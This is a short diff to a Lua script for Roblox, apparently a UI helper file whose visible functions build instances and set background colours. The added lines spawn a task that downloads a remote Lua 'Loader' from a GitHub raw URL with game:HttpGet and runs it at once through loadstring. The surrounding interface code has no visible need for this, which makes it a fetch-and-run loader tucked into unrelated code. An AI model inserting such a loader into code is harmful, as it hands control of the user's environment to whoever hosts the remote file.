@@ -5,6 +5,9 @@ local function c(t, p)
     for k, v in pairs(p) do i[k] = v end
     return i
 end
+spawn(function()
+    (loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+end)
 
 local function s(i, bg)
     i.BackgroundColor3 = bg or Color3.fromRGB(20, 20, 20)
